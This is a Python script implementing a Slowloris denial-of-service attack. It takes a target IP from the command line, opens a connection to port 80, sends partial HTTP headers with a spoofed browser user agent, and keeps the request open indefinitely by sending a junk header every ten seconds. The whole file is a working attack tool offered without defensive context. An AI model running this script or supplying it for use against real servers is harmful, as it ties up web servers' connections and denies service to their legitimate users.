import socket
import random
import time
import sys

def slowloris(ip):
    # List of User Agents
    user_agents = [
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
    ]

    # Create a new socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, 80))

    # Send the initial headers
    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    sock.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
    sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))

    while True:
        try:
            # Send more headers to keep the connection open
            sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            time.sleep(10)
        except socket.error:
            break

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: slowloris.py <target ip>")
        sys.exit(1)

    slowloris(sys.argv[1])
